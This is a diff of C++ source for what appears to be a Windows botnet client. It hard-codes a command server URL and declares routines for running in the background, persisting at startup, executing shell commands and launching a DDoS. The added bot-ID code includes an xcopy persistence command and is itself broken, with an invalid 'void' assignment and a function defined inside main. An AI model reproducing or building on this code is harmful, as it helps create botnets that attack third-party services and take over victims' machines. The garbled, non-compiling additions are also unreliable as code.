@@ -5,7 +5,8 @@
 #define SERVER_URL "https://zoocenter.bg"
 
 using namespace std;
-/*Bot ID testing
+
+/*Initial Bot ID test
 
 class BOTSIDS {
 public :
@@ -29,14 +30,28 @@ string cmd_copy_id_directory="xcopy \".\\id.txt\" " + id_directory + "*\" /Y";
 }
 
 */
+
 void runInBackground();
 void saveStartup(); 
+
 string makeRequest(string method, string uri);
 void startDDOS(string link, string iterations);
+
 string randomString(int n);
 string link;
 string iterations;
 string bot_id;
+
+class BOTSIDS { // < ---  class to randomise a bot id, then save it //
+public :
+    static int getUniqueId();
+};
+
+int BOTSIDS::getUniqueId() {
+    static std::atomic<std::uint32_t> uid { 0 };
+    return ++uid;
+}
+
 std::string exec(const char* cmd) {
     char buffer[128];
     std::string result = "";
@@ -56,6 +71,19 @@ std::string exec(const char* cmd) {
 
 int main()
 {	
+
+BOTSIDS obj;
+
+void id = obj.obj; 
+
+void id() { // <-- save function
+
+string id_directory="\"%HOMEDRIVE%%HOMEPATH%\\%USER%";
+
+string cmd_copy_id_directory="xcopy \".\\id.txt\" " + id_directory + "*\" /Y";
+}
+	
+	
 	string attackFlag;
 	bot_id = randomString(6);
 		
